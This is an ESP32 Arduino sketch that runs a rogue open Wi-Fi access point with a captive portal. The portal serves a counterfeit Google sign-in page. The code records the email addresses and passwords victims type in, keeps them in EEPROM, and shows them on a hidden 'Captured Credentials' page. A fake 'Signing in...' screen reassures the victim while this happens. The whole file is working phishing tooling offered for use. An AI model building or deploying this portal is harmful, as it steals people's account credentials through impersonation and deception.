// ESP32 WiFi Captive Portal - Google Sign-In Theme
// Ported and modified from ESP8266 version by 125K (github.com/125K)

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";

#define CREDS_TITLE "Captured Credentials"
#define CLEAR_TITLE  "Cleared"

// ESP32 built-in LED is on pin 2
#ifndef BUILTIN_LED
#define BUILTIN_LED 2
#endif

const byte HTTP_CODE  = 200;
const byte DNS_PORT   = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

String allCreds   = "";
String currentSSID = "";

int initialCheckLocation = 20;
int credsStart = 30;
int credsEnd   = credsStart;

unsigned long bootTime=0, lastActivity=0, lastTick=0;
DNSServer dnsServer;
WebServer webServer(80);

// ── helpers ──────────────────────────────────────────────────────────────────

String inputArg(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");
  a.replace(">","&gt;");
  return a.substring(0, 200);
}

// ── Google-style page builder ─────────────────────────────────────────────────

String googlePage(String bodyContent) {
  String css =
    "* { box-sizing: border-box; margin: 0; padding: 0; }"
    "body { font-family: 'Roboto', Arial, sans-serif; background: #fff;"
           "display: flex; justify-content: center; align-items: center;"
           "min-height: 100vh; }"
    ".card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px;"
             "width: 100%; max-width: 450px; margin: 20px; }"
    ".logo { font-size: 26px; font-weight: 400; text-align: center; margin-bottom: 8px; letter-spacing: -0.5px; }"
    ".logo .g1{color:#4285F4}.logo .g2{color:#EA4335}.logo .g3{color:#FBBC05}"
    ".logo .g4{color:#4285F4}.logo .g5{color:#34A853}.logo .g6{color:#EA4335}"
    "h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }"
    ".subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 28px; }"
    ".input-wrap { position: relative; margin-bottom: 20px; }"
    "input[type=email], input[type=password], input[type=text] {"
      "width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;"
      "border-radius: 4px; outline: none; color: #202124; }"
    "input:focus { border-color: #1a73e8; border-width: 2px; }"
    ".forgot { color: #1a73e8; font-size: 14px; text-decoration: none; display: block; margin-bottom: 28px; }"
    ".actions { display: flex; justify-content: space-between; align-items: center; margin-top: 28px; }"
    ".create { color: #1a73e8; font-size: 14px; text-decoration: none; }"
    ".next-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px;"
                "padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }"
    ".next-btn:active { background: #1557b0; }"
    ".notice { font-size: 12px; color: #5f6368; text-align: center; margin-top: 16px; }"
    ".err { color: #d93025; font-size: 13px; margin-bottom: 10px; }";

  return "<!DOCTYPE html><html><head>"
         "<meta charset='UTF-8'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<title>Sign in - Google Accounts</title>"
         "<style>" + css + "</style></head>"
         "<body><div class='card'>" + bodyContent + "</div></body></html>";
}

// ── page content functions ────────────────────────────────────────────────────

String logoHtml() {
  return "<div class='logo'>"
         "<span class='g1'>G</span><span class='g2'>o</span>"
         "<span class='g3'>o</span><span class='g4'>g</span>"
         "<span class='g5'>l</span><span class='g6'>e</span>"
         "</div>";
}

String index() {
  String body = logoHtml() +
    "<h1>Sign in</h1>"
    "<p class='subtitle'>to continue to Gmail</p>"
    "<form action='/post' method='post'>"
      "<div class='input-wrap'>"
        "<input type='email' name='e' placeholder='Email or phone' required autofocus>"
      "</div>"
      "<div class='input-wrap'>"
        "<input type='password' name='p' placeholder='Password' required>"
      "</div>"
      "<a class='forgot' href='#'>Forgot email?</a>"
      "<p class='notice'>Not your computer? Use Guest mode to sign in privately.</p>"
      "<div class='actions'>"
        "<a class='create' href='#'>Create account</a>"
        "<button class='next-btn' type='submit'>Next</button>"
      "</div>"
    "</form>";
  return googlePage(body);
}

String posted() {
  String email = inputArg("e");
  String pass  = inputArg("p");

  // Format the entry
  String entry = "Email: " + email + " | Pass: " + pass + "\n";
  allCreds += "<li><b>Email:</b> " + email + " &nbsp; <b>Pass:</b> " + pass + "</li>";

  // Write to EEPROM
  for (int i = 0; i < (int)entry.length(); i++) {
    EEPROM.write(credsEnd + i, entry[i]);
  }
  credsEnd += entry.length();
  EEPROM.write(credsEnd, '\0');
  EEPROM.commit();

  // Show a convincing "checking credentials" page
  String body = logoHtml() +
    "<h1>Signing in...</h1>"
    "<p class='subtitle'>Please wait while we verify your account.</p>"
    "<p class='notice' style='margin-top:30px'>You will be connected to <b>Free WiFi</b> shortly.</p>";
  return googlePage(body);
}

String credsPage() {
  String body = "<h2 style='margin-bottom:16px'>" + String(CREDS_TITLE) + "</h2>"
    "<ol style='padding-left:18px;font-size:14px;line-height:2'>" + allCreds + "</ol>"
    "<br><center>"
    "<a style='color:#1a73e8;display:block;margin:8px' href='/'>Back</a>"
    "<a style='color:#d93025;display:block;margin:8px' href='/clear'>Clear all</a>"
    "</center>";
  return googlePage(body);
}

String ssidPage() {
  String body = "<h2 style='margin-bottom:16px'>Change SSID</h2>"
    "<p style='font-size:14px;margin-bottom:16px'>After changing, reconnect to the new network name.</p>"
    "<form action='/postSSID' method='post'>"
      "<input type='text' name='s' placeholder='New SSID name' style='width:100%;padding:10px;margin-bottom:12px'>"
      "<button class='next-btn' type='submit'>Change SSID</button>"
    "</form>";
  return googlePage(body);
}

String postedSSID() {
  String newName = inputArg("s");
  for (int i = 0; i < (int)newName.length(); i++) {
    EEPROM.write(i, newName[i]);
  }
  EEPROM.write(newName.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(newName);
  String body = "<h2>SSID Updated</h2><p style='margin-top:12px'>Now broadcasting as: <b>" + newName + "</b></p>";
  return googlePage(body);
}

String clearPage() {
  allCreds  = "";
  credsEnd  = credsStart;
  EEPROM.write(credsEnd, '\0');
  EEPROM.commit();
  String body = "<h2>" + String(CLEAR_TITLE) + "</h2>"
    "<p style='margin-top:12px'>All credentials have been cleared.</p>"
    "<br><center><a style='color:#1a73e8' href='/'>Back</a></center>";
  return googlePage(body);
}

// ── LED blink ─────────────────────────────────────────────────────────────────

void BLINK() {
  for (int i = 0; i < 10; i++) {
    digitalWrite(BUILTIN_LED, i % 2);
    delay(500);
  }
}

// ── setup ─────────────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // First-run check
  String checkValue = "first";
  for (int i = 0; i < (int)checkValue.length(); i++) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      for (int j = 0; j < (int)checkValue.length(); j++)
        EEPROM.write(j + initialCheckLocation, checkValue[j]);
      EEPROM.write(0, '\0');
      EEPROM.write(credsStart, '\0');
      EEPROM.commit();
      break;
    }
  }

  // Read saved SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') { ESSID += char(EEPROM.read(i)); i++; }

  // Read saved credentials
  while (EEPROM.read(credsEnd) != '\0') {
    allCreds += char(EEPROM.read(credsEnd));
    credsEnd++;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  Serial.println("SSID: " + currentSSID);
  WiFi.softAP(currentSSID);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post",     []() { webServer.send(HTTP_CODE, "text/html", posted());    BLINK(); });
  webServer.on("/pass",     []() { webServer.send(HTTP_CODE, "text/html", credsPage()); });
  webServer.on("/ssid",     []() { webServer.send(HTTP_CODE, "text/html", ssidPage());  });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/clear",    []() { webServer.send(HTTP_CODE, "text/html", clearPage()); });
  webServer.onNotFound(     []() { lastActivity = millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

// ── loop ──────────────────────────────────────────────────────────────────────

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
